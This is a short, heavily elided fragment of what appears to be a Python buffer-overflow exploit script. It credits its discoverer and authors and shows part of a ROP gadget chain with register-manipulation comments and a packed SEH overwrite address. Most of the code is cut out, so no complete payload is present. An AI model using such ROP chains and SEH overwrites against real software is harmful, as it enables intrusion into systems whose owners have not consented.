...
# discovered by: bzyo
# Exploit Template Author:  blackleitus
# Exploit Author: Freshnuts
# Date: 2024-09-10
...
def create_rop_gadgets():
    ...
    rop_gadgets = [
      ...
      0x6c94e84f,  # xchg eax, ebx ; ret ; (1 found)
        ...
        # [xchg eax, ebx] to revert 0xfffffdff back to 0x201
        # revert back to 0x201 using [neg eax]
        # [xchg eax, ebx] 
...
seh   = struct.pack("<L", 0x6c998dce) # 43434343 (CCCC) Ccurrent SEH record;
